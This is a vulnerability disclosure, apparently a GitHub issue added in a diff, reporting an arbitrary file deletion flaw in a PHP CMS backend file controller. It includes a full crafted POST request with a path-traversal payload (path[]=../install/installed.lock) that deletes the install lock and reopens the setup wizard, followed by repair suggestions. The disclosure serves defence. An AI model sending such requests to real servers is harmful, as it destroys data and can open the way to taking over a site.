@@ -1,0 +1,40 @@
+Vulnerability file: \protected\controller\backend\file_controller.php
+It can be seen that the deleted file or directory is received through the path parameter, and is directly deleted without security filtering, so we can use this vulnerability to delete any file
+![image](https://user-images.githubusercontent.com/90141086/159689762-0e63e61c-7234-4a9e-884c-5f7cd4bf89bb.png)
+
+Vulnerability to reproduce:
+1. First log in to the background to get cookies。
+
+2. Here I delete the installed.lock file to verify the existence of the vulnerability，construct the packet as follows:
+
+  POST /index.php?m=backend&c=file&a=delete HTTP/1.1
+  Host: www.xxx.com
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+  Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+  Accept-Encoding: gzip, deflate
+  Referer: http://www.xiaodi.com/index.php?m=backend&c=file&a=index
+  Cookie: VDSSKEY=d6123bedd1b697a783c9da6f0b92254c
+  DNT: 1
+  Connection: close
+  Upgrade-Insecure-Requests: 1
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 32
+  
+  path[]=../install/installed.lock
+
+3、Click Send Packet,you can see that the file was deleted successfully
+![image](https://user-images.githubusercontent.com/90141086/159695536-d0b07eb4-9c48-4bc7-a158-0677406160fc.png)
+
+4、It can be seen that when the installed.lock file exists, when visiting http://x.x.x/install, the page will directly jump to the front home page
+![image](https://user-images.githubusercontent.com/90141086/159697683-b812ea24-5a46-4d95-83a0-b239211fb8a9.png)
+
+Therefore, when we delete the installed.lock file and visit http://x.x.x/install again, we will come to the installation wizard page
+![image](https://user-images.githubusercontent.com/90141086/159696798-eee9f50f-7051-4356-82c1-ef2ddb1621a1.png)
+
+Repair suggestion:
+1. Filter ../ or ..\\ in the file variable
+2. Limit the scope of deleted files or directories
+
+
+
